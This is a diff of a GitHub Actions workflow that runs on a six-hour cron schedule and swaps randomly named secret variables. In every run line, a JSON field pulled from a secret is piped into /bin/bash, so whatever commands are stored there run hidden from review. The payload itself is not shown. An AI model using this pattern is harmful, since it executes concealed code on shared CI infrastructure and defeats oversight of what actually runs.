@@ -3,26 +3,30 @@ name: luyuhuan4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 0/6 * * *'
-jobs:  # 22628
+    - cron: '32 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luyuhuan4567
         env:
-          fd4: ${{ secrets.fd4 }}
+          tfcgl4: ${{ secrets.tfcgl4 }}
         run: |
-          echo $fd4 | jq -r .pqhmk48 | /bin/bash
-          echo $pvk01 | jq -r .cde0 | /bin/bash
-          echo $ybc34 | jq -r .ui70263 | /bin/bash
-          echo $cyx126 | jq -r .qhlt91860 | /bin/bash
-          echo $h3659 | jq -r .ozsud6108 | /bin/bash
-          echo $y989 | jq -r .mapkc42650 | /bin/bash
-          echo $z750 | jq -r .htty031 | /bin/bash
-          echo $vxji08 | jq -r .w5901 | /bin/bash
-          echo $ml137 | jq -r .j8 | /bin/bash
-          echo $oxs39 | jq -r .jlu2468 | /bin/bash
-          echo $psq9473 | jq -r .jo34 | /bin/bash
-          echo $f899 | jq -r .a18949 | /bin/bash
+          echo $tfcgl4 | jq -r .cjn8430 | /bin/bash
+          echo $ggtpi07 | jq -r .q7 | /bin/bash
+          echo $nhq99017 | jq -r .x4 | /bin/bash
+          echo $tb846 | jq -r .e3091 | /bin/bash
+          echo $lnac82044 | jq -r .osz71386 | /bin/bash
+          echo $as52 | jq -r .so6669 | /bin/bash
+          echo $uutd98 | jq -r .etfs97151 | /bin/bash
+          echo $lxpio3 | jq -r .ihswd4506 | /bin/bash
+          echo $ojyx990 | jq -r .aocd2 | /bin/bash
+          echo $byu6327 | jq -r .qff917 | /bin/bash
+          echo $ty37004 | jq -r .hjus5 | /bin/bash
+          echo $be55 | jq -r .mmin0851 | /bin/bash
+          echo $ko104 | jq -r .et81 | /bin/bash
+          echo $t84 | jq -r .ww1 | /bin/bash
 
